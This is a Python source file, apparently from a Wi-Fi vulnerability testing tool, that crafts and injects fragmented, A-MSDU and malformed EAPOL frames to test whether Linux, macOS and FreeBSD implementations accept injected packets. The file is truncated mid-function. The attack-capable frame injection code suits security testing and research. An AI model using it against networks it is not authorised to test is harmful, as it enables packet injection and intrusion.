#!/usr/bin/env python3
# TODO: Other traffic on the interface might interfere with attacks. How to prevent?
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select, copy
import argparse
import os.path
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key
from scapy.arch.common import get_if_raw_hwaddr

from tests_qca import *

# ----------------------------------- Utility Commands -----------------------------------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

#TODO: Modify so we can ignore other messages over the command interface
def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, f"Failed to execute command {cmd}")
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

def log_level2switch():
	if options.debug >= 2: return ["-dd", "-K"]
	elif options.debug >= 1: return ["-d", "-K"]
	return ["-K"]

#TODO: Move to libwifi?
def add_msdu_frag(src, dst, payload):
	length = len(payload)
	p = Ether(dst=dst, src=src, type=length)

	payload = raw(payload)

	total_length = len(p) + len(payload)
	padding = ""
	if total_length % 4 != 0:
		padding = b"\x00" * (4 - (total_length % 4))

	return p / payload / Raw(padding)

def freebsd_create_eapolmsdu(src, dst, payload):
	"""
	FreeBSD doesn't properly parse EAPOL/MSDU frames for some reason.
	It's unclear why. But this code puts the length and addresses at
	the right positions so FreeBSD will parse the A-MSDU frame
	successfully, so that we can even attack bad implementations.
	"""

	# EAPOL and source address. I don't think the value "\x00\06" is important
	rawmac = bytes.fromhex(src.replace(':', ''))
	prefix = raw(LLC()/SNAP()/EAPOL()) + b"\x00\x06" + rawmac

	# Length followed by the payload
	payload = add_msdu_frag(src, dst, payload)
	payload = prefix + struct.pack(">I", len(payload)) + raw(payload)

	# Put the destination MAC address in the "right" place
	rawmac = bytes.fromhex(dst.replace(':', ''))
	payload = payload[:16] + rawmac[:4] + payload[20:]

	return payload

def freebsd_encap_eapolmsdu(p, src, dst, payload):
	"""
	Here p is the header of a frame, and payload the desired content
	that will be accepted by FreeBSD.
	"""

	# Broadcast/multicast fragments do not affect the fragment cache
	p.addr1 = "ff:ff:ff:ff:ff:ff"

	# Encapsulate EAPOL in malformed EAPOL/A-MSDU fragment
	p.Reserved = 1


	p = p/freebsd_create_eapolmsdu(src, dst, payload)
	return p


# ----------------------------------- Vulnerability Tests -----------------------------------

# XXX --- We should always first see how the DUT reactions to a normal packet.
#	  For example, Aruba only responded to DHCP after reconnecting, and
#	  ignored ICMP and ARP packets.
REQ_ARP, REQ_ICMP, REQ_ICMPv6_RA, REQ_DHCP = range(4)

def generate_request(sta, ptype, prior=2, icmp_size=None, padding=None, to_self=False):
	header = sta.get_header(prior=prior)

	# Test handle the client handles Ethernet frames with the same src and dst MAC address
	to_ds = header.FCfield & Dot11(FCfield="to-DS").FCfield != 0
	if to_self and to_ds:
		log(ERROR, "Impossible test! Can't send frames to the AP where both Ethernet dst and src are the same.")
	elif to_self:
		header.addr3 = header.addr1

	if ptype == REQ_ARP:
		# Avoid using sta.get_peermac() because the correct MAC addresses may not
		# always be known (due to difference between AP and router MAC addresses).
		check = lambda p: ARP in p and p.hwdst == sta.mac and p.pdst == sta.ip \
				  and p.psrc == sta.peerip and p[ARP].op == 2
		request = LLC()/SNAP()/ARP(op=1, hwsrc=sta.mac, psrc=sta.ip, pdst=sta.peerip)

	elif ptype == REQ_ICMP:
		label = b"test_ping_icmp"

		if icmp_size == None: icmp_size = 0
		payload = label + b"A" * max(0, icmp_size - len(label))

		check = lambda p: ICMP in p and label in raw(p) and p[ICMP].type == 0
		request = LLC()/SNAP()/IP(src=sta.ip, dst=sta.peerip)/ICMP()/Raw(payload)

	elif ptype == REQ_ICMPv6_RA:
		dns_ipv6 = "fd75:7c74:2274:1::53"

		p = IPv6(dst="ff02::1", src=sta.ipv6)/ICMPv6ND_RA()
		p = p/ICMPv6NDOptSrcLLAddr(lladdr=sta.mac)/ICMPv6NDOptMTU()
		p = p/ICMPv6NDOptPrefixInfo(prefixlen=64, prefix="d00d::")
		p = p/ICMPv6NDOptRDNSS(lifetime=900, dns=[dns_ipv6])

		request = LLC()/SNAP()/p
		check = lambda p: IPv6 in p and p[IPv6].dst == dns_ipv6

	elif ptype == REQ_DHCP:
		xid = random.randint(0, 2**31)

		check = lambda p: BOOTP in p and p[BOOTP].xid == xid and p[BOOTP].op == 2

		rawmac = bytes.fromhex(sta.mac.replace(':', ''))
		request = LLC()/SNAP()/IP(src="0.0.0.0", dst="255.255.255.255")
		request = request/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=xid)
		request = request/DHCP(options=[("message-type", "discover"), "end"])

		# We assume DHCP discover is sent towards the AP.
		header.addr3 = "ff:ff:ff:ff:ff:ff"

	if padding != None and padding >= 1:
		request = raw(request) + b"\x00" + b"A" * (padding - 1)

	return header, request, check

class Action():
	# StartAuth: when starting the handshake
	# BeforeAuth: right before last message of the handshake
	# AfterAuth: right after last message of the handshake
	# Connected: 1 second after handshake completed (allows peer to install keys)
	NoTrigger, StartAuth, BeforeAuth, AfterAuth, Connected = range(5)

	# GetIp: request an IP before continueing (or use existing one)
	# Rekey: force or wait for a PTK rekey
	# Reconnect: force a reconnect
	# Roam: perform an FT roam
	# Inject: inject the associated packet
	# Func: execute a given function
	# Meta: meta-action used (and removed) during test construction
	NoAction, GetIp, Rekey, Reconnect, Roam, Inject, Func = range(7)

	# Drop: when fragmenting frames, skip the next fragment number. Used in PingTest.
	MetaDrop = range(0)

	def __init__(self, trigger=Connected, action=Inject, meta_action=None, func=None, enc=False, frame=None, inc_pn=1, delay=None, wait=None, key=None):
		self.trigger = trigger
		self.action = action

		self.meta_action = meta_action
		if self.meta_action != None:
			self.trigger = Action.NoTrigger
			self.action = Action.NoAction

		self.func = func
		if self.func != None:
			self.action = Action.Func

		# Take into account default wait values. A wait value of True means the next
		# Action will not be immediately executed if it has the same trigger (instead
		# we have to wait on a new trigger e.g. after rekey, reconnect, roam).
		self.wait = wait
		if self.wait == None:
			self.wait = action in [Action.Rekey, Action.Reconnect, Action.Roam]

		# Specific to fragment injection
		self.encrypted = enc
		self.inc_pn = inc_pn
		self.delay = delay
		self.frame = frame
		self.key = key

	def is_meta(self, meta):
		return self.meta_action == meta

	def get_action(self):
		return self.action

	def __str__(self):
		trigger = ["NoTigger", "StartAuth", "BeforeAuth", "AfterAuth", "Connected"][self.trigger]
		action = ["NoAction", "GetIp", "Rekey", "Reconnect", "Roam", "Inject", "Func"][self.action]
		return f"Action({trigger}, {action})"

	def __repr__(self):
		return str(self)

class Test(metaclass=abc.ABCMeta):
	"""
	Base class to define tests. The default defined methods can be used,
	but they can also be overriden if desired.
	"""

	def __init__(self, actions=None):
		self.actions = actions if actions != None else []
		self.generated = False
		self.delay = None
		self.inc_pn = None

	def next_trigger_is(self, trigger):
		if len(self.actions) == 0:
			return False
		if self.actions[0].trigger == Action.NoTrigger:
			return True
		return self.actions[0].trigger == trigger

	def is_next_inject(self):
		if len(self.actions) == 0:
			return False
		if self.actions[0].is_meta(Action.MetaDrop):
			return True
		return self.actions[0].action == Action.Inject

	def next_action(self, station):
		if len(self.actions) == 0:
			return None

		if not self.generated and self.is_next_inject():
			self.generate(station)
			self.generated = True

		act = self.actions[0]
		del self.actions[0]
		return act

	def get_actions(self, action):
		return [act for act in self.actions if act.action == action]

	@abc.abstractmethod
	def prepare(self, station):
		pass

	def generate(self, station):
		self.prepare(station)
		self.enforce_delay()
		self.enforce_inc_pn()

	@abc.abstractmethod
	def check(self, p):
		return False

	def set_general_options(self, delay=None, inc_pn=None):
		self.delay = delay
		self.inc_pn = inc_pn

	def enforce_delay(self):
		if self.delay == None or self.delay <= 0:
			return

		# Add a delay between injected fragments if requested
		for frag in self.get_actions(Action.Inject)[1:]:
			frag.delay = self.delay

	def enforce_inc_pn(self):
		if self.inc_pn == None:
			return

		# Use specific PN increments between frames if requested
		for frag in self.get_actions(Action.Inject)[1:]:
			frag.inc_pn = self.inc_pn

class PingTest(Test):
	def __init__(self, ptype, fragments, separate_with=None, opt=None):
		super().__init__(fragments)
		self.ptype = ptype
		self.separate_with = separate_with
		self.check_fn = None

		self.bcast = False if opt == None else opt.bcast
		self.as_msdu = False if opt == None else opt.as_msdu
		self.icmp_size = None if opt == None else opt.icmp_size
		self.padding = None if opt == None else opt.padding
		self.to_self = False if opt == None else opt.to_self

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype, icmp_size=self.icmp_size, padding=self.padding, to_self=self.to_self)

		if self.as_msdu == 1:
			# Set the A-MSDU frame type flag in the QoS header
			header.Reserved = 1
			# Encapsulate the request in an A-MSDU payload
			request = add_msdu_frag(station.mac, station.get_peermac(), request)
		elif self.as_msdu == 2:
			# Set A-MSDU flag but include a normal payload (fake A-MSDU)
			header.Reserved = 1

		# Create list of fragment numbers to be used
		fragnums = []
		next_fragnum = 0
		for act in self.actions:
			if act.is_meta(Action.MetaDrop):
				next_fragnum += 1
			elif act.action == Action.Inject:
				fragnums.append(next_fragnum)
				next_fragnum += 1
		self.actions = list(filter(lambda act: not act.is_meta(Action.MetaDrop), self.actions))

		# Generate all the individual (fragmented) frames
		num_frags = len(self.get_actions(Action.Inject))
		frames = create_fragments(header, request, num_frags)

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			if self.bcast:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"

			# Assign fragment numbers according to MetaDrop rules
			frame.SC = (frame.SC & 0xfff0) | fragnums.pop(0)

			frag.frame = frame

		# Put the separator after each fragment if requested.
		if self.separate_with != None:
			for i in range(len(self.actions) - 1, 0, -1):
				# Check if the previous action is indeed an injection
				prev_frag = self.actions[i - 1]
				if prev_frag.action != Action.Inject:
					continue

				# Create a similar inject action for the seperator
				sep_frag = Action(prev_frag.trigger, enc=prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.actions.insert(i, sep_frag)

class ForwardTest(Test):
	def __init__(self):
		super().__init__([
			Action(Action.Connected, enc=True)
		])
		self.magic = b"forwarded_data"

	def check(self, p):
		return self.magic in raw(p)

	def prepare(self, station):
		# We assume we are targetting the AP
		header = station.get_header(prior=2)
		if header.FCfield & Dot11(FCfield="to-DS").FCfield == 0:
			log(ERROR, "Impossible test! It makes to sense to test whether a client forwards frames.")

		# Set final destination to be us, the client
		header.addr3 = station.mac

		self.actions[0].frame = header/LLC()/SNAP()/IP()/Raw(self.magic)

class LinuxTest(Test):
	def __init__(self, ptype, decoy_tid=None):
		super().__init__([
			# Note: to inject immediately after 4-way provide IPs using --ip and --peerip
			Action(Action.Connected, Action.GetIp),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=False)
		])
		self.ptype = ptype
		self.check_fn = None
		self.decoy_tid = decoy_tid

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.actions[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number. Use a dummy packet
		# that can't accidently aggregate with the first fragment in a corrrect packet.
		p = station.get_header(prior=2)/LLC()/SNAP()/IP()/Raw(b"linux_plain decoy fragment")
		p.SC = frag2.SC ^ (1 << 4)

		# - In the attack against Linux, the decoy frame must have the same QoS TID.
		# - On the other hand, some devices seem to only cache fragments for one sequence
		#   number per QoS priority. So to avoid overwriting the first fragment, add this
		#   option to use a different priority for it.
		p.TID = 2
		if self.decoy_tid != None:
			p.TID = 3

		self.actions[1].frame = p

		# Fragment 3: can now inject last fragment as plaintext
		self.actions[2].frame = frag2

class MacOsTest(Test):
	"""
	See docs/macoxs-reversing.md for background on the attack.
	"""
	def __init__(self, ptype, actions):
		super().__init__(actions)
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, self.check_fn = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[1].frame = frag2

class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Action(Action.BeforeAuth, enc=False),
			Action(Action.BeforeAuth, enc=False)
		])

	def prepare(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[0].frame = frag2


class EapolMsduTest(Test):
	def __init__(self, ptype, actions, freebsd=False):
		super().__init__(actions)
		self.ptype = ptype
		self.check_fn = None
		self.freebsd = freebsd

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the single frame
		header, request, self.check_fn = generate_request(station, self.ptype)
		# Set the A-MSDU frame type flag in the QoS header
		header.Reserved = 1
		# Testing
		#header.addr2 = "00:11:22:33:44:55"

		# Masquerade A-MSDU frame as an EAPOL frame
		if self.freebsd:
			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
			request = freebsd_create_eapolmsdu(station.mac, station.get_peermac(), request)
		else:
			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / add_msdu_frag(station.mac, station.get_peermac(), request)

		frames = create_fragments(header, request, 1)

		# XXX Where was this needed again?
		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
		station.set_header(auth)
		auth.addr2 = "00:11:22:33:44:55"

		self.actions[0].frame = auth
		self.actions[1].frame = frames[0]


# ----------------------------------- Abstract Station Class -----------------------------------

class Station():
	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.test = daemon.options.test
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.obtained_ip = False
		self.waiting_on_ip = False

		# Don't reset PN to have consistency over rekeys and reconnects
		self.reset_keys()
		self.pn = [0x100] * 16

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield
		self.seqnum = 16

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None
		self.ipv6 = "fe80::a00:27ff:fec6:2f54"

		# MAC address of the BSS. This is always the AP.
		self.bss = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To trigger Connected event 1-2 seconds after Authentication
		self.time_connected = None

	def reset_keys(self):
		self.tk = None
		self.gtk = None
		self.gtk_idx = None

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		if self.test != None and self.test.check != None and self.test.check(p):
			log(STATUS, "SUCCESSFULL INJECTION", color="green")
			log(STATUS, "Received packet: " + repr(p))
			self.test = None

	# FIXME: EAPOL should not be send to peer_mac() always??
	def send_mon(self, data, prior=1):
		"""
		Right after completing the handshake, it occurred several times that our
		script was sending data *before* the key had been installed (or the port
		authorized). This meant traffic was dropped. Use this function to manually
		send frames over the monitor interface to ensure delivery and encryption.

		By default we use a TID of 1. Since our tests by default use a TID of 2,
		this reduces the chance the frames sent using this function (which most
		are EAP or EAPOL frames) interfere with the reassembly of frames sent by
		the tests.
		"""

		# If it contains an Ethernet header, strip it, and take addresses from that
		p = self.get_header(prior=prior)
		if Ether in data:
			payload = data.payload
			p.addr2 = data.src

			# This tests if to-DS is set
			if p.FCfield & 1:
				p.addr3 = data.dst
			else:
				p.addr1 = data.dst

		else:
			payload = data

		# Add payload headers
		payload = LLC()/SNAP()/payload

		# Special case when sending EAP(OL) frames to NetBSD. Must be EAPOL/MSDU because
		# only "EAPOL" frames are now accepted.
		if self.options.freebsd_cache and (EAP in data or EAPOL in data):
			log(STATUS, "Sending EAPOL as (malformed) broadcast EAPOL/A-MSDU")
			p = freebsd_encap_eapolmsdu(p, self.mac, self.get_peermac(), payload)

		# Normal case only need to check for encryption
		else:
			p = p/payload
			if self.tk: p = self.encrypt(p)

		daemon.inject_mon(p)
		log(STATUS, "[Injected] " + repr(p))

	def set_header(self, p, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		# Set the appropriate to-DS or from-DS bits
		p.FCfield |= self.FCfield

		# Add the QoS header if requested
		if prior != None:
			p.subtype = 8
			if not Dot11QoS in p:
				p.add_payload(Dot11QoS(TID=prior))
			else:
				p[Dot11QoS].TID = prior

		# This checks if the to-DS is set (frame towards the AP)
		if p.FCfield & 1 != 0:
			p.addr1 = self.bss
			p.addr2 = self.mac
			p.addr3 = self.get_peermac()
		else:
			p.addr1 = self.peermac
			p.addr2 = self.mac
			p.addr3 = self.bss

	def get_header(self, seqnum=None, prior=2, **kwargs):
		"""
		Generate a default common header. By default use priority of 1 so destination
		will still accept lower Packet Numbers on other priorities.
		"""

		if seqnum == None:
			seqnum = self.seqnum
			self.seqnum += 1

		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior, **kwargs)
		return header

	def encrypt(self, frame, inc_pn=1, force_key=None):
		idx = dot11_get_priority(frame) if self.options.pn_per_qos else 0
		self.pn[idx] += inc_pn

		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		if force_key == 0:
			log(STATUS, "Encrypting with all-zero key")
			key = b"\x00" * len(key)

		if len(key) == 16:
			encrypted = encrypt_ccmp(frame, key, self.pn[idx], keyid)
		else:
			encrypted = encrypt_wep(frame, key, self.pn[idx], keyid)

		return encrypted

	def handle_connecting(self, bss):
		log(STATUS, f"Station: setting BSS MAC address {bss}")
		self.bss = bss

		# Clear the keys on a new connection
		self.reset_keys()

	def set_peermac(self, peermac):
		self.peermac = peermac

	def get_peermac(self):
		# When being a client, the peermac may not yet be known. In that
		# case we assume it's the same as the BSS (= AP) MAC address.
		if self.peermac == None:
			return self.bss
		return self.peermac

	# TODO: Show a warning when unusual transitions are detected?
	def trigger_eapol_events(self, eapol):
		# Ignore EAP authentication handshakes
		if EAP in eapol: return None

		# Track return value of possible trigger Action function
		result = None

		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "Action.StartAuth", color="green")
			result = self.perform_actions(Action.StartAuth, eapol=eapol)
			self.txed_before_auth = True
			self.txed_before_auth_done = False

		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "Action.BeforeAuth", color="green")
			result = self.perform_actions(Action.BeforeAuth, eapol=eapol)
			self.txed_before_auth_done = True
			self.txed_before_auth = False

		self.time_connected = None
		return result

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		send_it = self.trigger_eapol_events(eapol)

		if send_it == None:
			# - Send over monitor interface to assure order compared to injected fragments.
			# - This is also important because the station might have already installed the
			#   key before this script can send the EAPOL frame over Ethernet (but we didn't
			#   yet request the key from this script).
			# - Send with high priority, otherwise Action.AfterAuth might be send before
			#   the EAPOL frame by the Wi-Fi chip.
			self.send_mon(eapol)

	def perform_actions(self, trigger, **kwargs):
		result = None
		if self.test == None:
			return

		frame = None
		while self.test.next_trigger_is(trigger):
			act = self.test.next_action(self)

			# TODO: Previously scheduled Connected on AfterAuth should be cancelled??
			if act.action == Action.GetIp and not self.obtained_ip:
				self.waiting_on_ip = True
				self.daemon.get_ip(self)
				break

			elif act.action == Action.Func:
				result = act.func(self, **kwargs)
				log(STATUS, "[Executed Function] Result=" + str(result))
				# TODO: How to collect multiple results on one trigger?

			elif act.action == Action.Rekey:
				# Force rekey as AP, wait on rekey as client
				self.daemon.rekey(self)

			elif act.action == Action.Roam:
				# Roam as client, TODO XXX what was AP?
				self.daemon.roam(self)

			elif act.action == Action.Reconnect:
				# Full reconnect as AP, reassociation as client
				self.daemon.reconnect(self)

			elif act.action == Action.Inject:
				if act.delay != None and act.delay > 0:
					log(STATUS, f"Sleeping {act.delay} seconds")
					time.sleep(act.delay)

				if act.encrypted:
					assert self.tk != None and self.gtk != None
					log(STATUS, "Encrypting with key " + self.tk.hex() + " " + repr(act.frame))
					frame = self.encrypt(act.frame, inc_pn=act.inc_pn, force_key=act.key)
				else:
					frame = act.frame

				self.daemon.inject_mon(frame)
				log(STATUS, "[Injected fragment] " + repr(frame))

			# Stop processing actions if requested
			if act.wait: break

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		#
		# Note: when the device is only operating in monitor mode, this does
		#	not seem to be a problem.
		#
		if self.options.inject_mf_workaround and frame != None and frame.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			log(STATUS, "[Injected packet] Prevented ath9k_htc bug after fragment injection")

		return result

	def update_keys(self):
		log(STATUS, "Requesting keys from wpa_supplicant")
		self.tk = self.daemon.get_tk(self)
		self.gtk, self.gtk_idx = self.daemon.get_gtk()

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""
		self.update_keys()

		# Note that self.time_connect may get changed in perform_actions
		log(STATUS, "Action.AfterAuth", color="green")
		self.time_connected = time.time() + self.options.connected_delay
		self.perform_actions(Action.AfterAuth)

	def handle_connected(self):
		"""This is called ~1 second after completing the handshake"""
		log(STATUS, "Action.Connected", color="green")
		self.perform_actions(Action.Connected)

	def set_ip_addresses(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip
		self.obtained_ip = True

		log(DEBUG, "Waiting on IP before forming next actions: " + str(self.waiting_on_ip))
		if self.waiting_on_ip:
			self.waiting_on_ip = False
			self.perform_actions(Action.Connected)

	def time_tick(self):
		if self.time_connected != None and time.time() > self.time_connected:
			self.time_connected = None
			self.handle_connected()

# ----------------------------------- Client and AP Daemons -----------------------------------

class Daemon(metaclass=abc.ABCMeta):
	def __init__(self, options):
		self.options = options

		self.nic_iface = None
		self.nic_mon = None
		self.nic_hwsim = None

		self.process = None
		self.sock_eth = None
		self.sock_mon = None
		self.sock_hwsim = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		pass

	@abc.abstractmethod
	def time_tick(self, station):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	@abc.abstractmethod
	def get_ip(self, station):
		pass

	@abc.abstractmethod
	def rekey(self, station):
		pass

	@abc.abstractmethod
	def reconnect(self, station):
		pass

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		try:
			subprocess.check_output(["rfkill", "unblock", "wifi"])
		except Exception as ex:
			log(ERROR, "Are you running as root (and in a Python virtualenv)?")
			quit(1)
		self.nic_iface = options.iface

		# 1. Assign/create interfaces according to provided options
		if self.options.hwsim:
			# TODO: Automatically create both interfaces?
			self.nic_iface, self.nic_hwsim = self.options.hwsim.split(",")
			self.nic_mon = options.iface
			set_macaddress(self.nic_iface, get_macaddress(self.nic_mon))

			if not self.options.ap:
				log(WARNING, f"Note: you must manually set {self.nic_mon} on the channel of the AP")

		elif self.options.inject:
			# Use the provided interface to monitor/inject frames
			self.nic_mon = self.options.inject

		else:
			# Create second virtual interface in monitor mode. Note: some kernels
			# don't support interface names of 15+ characters.
			self.nic_mon = "mon" + self.nic_iface[:12]

			# Only create a new monitor interface if it does not yet exist
			try:
				scapy.arch.get_if_index(self.nic_mon)
			except IOError:
				subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
				subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])

			# Remember whether to need to perform a workaround.
			driver = get_device_driver(self.nic_iface)
			if driver == None:
				log(WARNING, "Unable to detect driver of interface!")
				log(WARNING, "Injecting fragments may be unreliable.")
			elif driver in ["ath9k_htc", "iwlwifi"]:
				options.inject_mf_workaround = True
				log(STATUS, f"Detected {driver}, using injection bug workarounds")

			log(WARNING, "Remember to use a modified backports and ath9k_htc firmware!")

		# 2. Enable monitor mode
		set_monitor_mode(self.nic_mon)
		log(STATUS, f"Using interface {self.nic_mon} to inject frames.")
		if self.nic_hwsim:
			set_monitor_mode(self.nic_hwsim)

		# 3. Configure test interface if used
		if self.options.inject_test:
			set_monitor_mode(self.options.inject_test)

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def connect_wpaspy(self):
		# Wait until daemon started
		while not os.path.exists("wpaspy_ctrl/" + self.nic_iface):
			time.sleep(0.1)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly.")
			log(ERROR, "Please restart it manually and inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

	def follow_channel(self):
		channel = get_channel(self.nic_iface)
		if self.options.inject:
			set_channel(self.nic_mon, channel)
			log(STATUS, f"{self.nic_mon}: setting to channel {channel}")
		elif self.options.hwsim:
			set_channel(self.nic_hwsim, channel)
			set_channel(self.nic_mon, channel)
			log(STATUS, f"{self.nic_hwsim}: setting to channel {channel}")
			log(STATUS, f"{self.nic_mon}: setting to channel {channel}")

		if self.options.inject_test:
			set_channel(self.options.inject_test, channel)
			log(STATUS, f"{self.options.inject_test}: setting to channel {channel}")
			# When explicitly testing we can afford a longer timeout. Otherwise we should avoid it.
			time.sleep(0.5)

	def injection_test(self, peermac):
		# Only perform the test when explicitly requested
		if self.options.inject_test == None and not self.options.inject_selftest:
			return

		try:
			test_injection(self.nic_mon, self.options.inject_test, peermac)
		except IOError as ex:
			log(WARNING, ex.args[0])
			log(ERROR, "Unexpected error. Are you using the correct kernel/driver/device?")
			quit(1)

		log(DEBUG, f"Passed injection self-test on interface {self.nic_mon}.")
		quit(1)

	def forward_hwsim(self, p, s):
		if p == None: return
		if not Dot11 in p: return
		if p.type != 0 and p.type != 2: return

		if len(p) >= 2200:
			log(DEBUG, f"Cannot forward frame longer than MTU (length {len(p)}).")
			return

		s.send(p)

	def run(self):
		self.configure_interfaces()

		# Remove old occurrences of the control interface that didn't get cleaned properly
		subprocess.call(["rm", "-rf", "wpaspy_ctrl/"])

		self.start_daemon()

		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		if self.nic_hwsim:
			self.sock_hwsim = MonitorSocket(type=ETH_P_ALL, iface=self.nic_hwsim)

		# Post-startup configuration of the supplicant or AP
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		sockets = [self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s]
		if self.sock_hwsim: sockets.append(self.sock_hwsim)
		while True:
			sel = select.select(sockets, [], [], 0.5)
			if self.sock_hwsim in sel[0]:
				p = self.sock_hwsim.recv()
				if p != None: self.forward_hwsim(p, self.sock_mon)

			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon(p)
				if self.sock_hwsim:
					self.forward_hwsim(p, self.sock_hwsim)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

			self.time_tick()

	def stop(self):
		log(STATUS, "Closing daemon and cleaning up ...")
		if self.process:
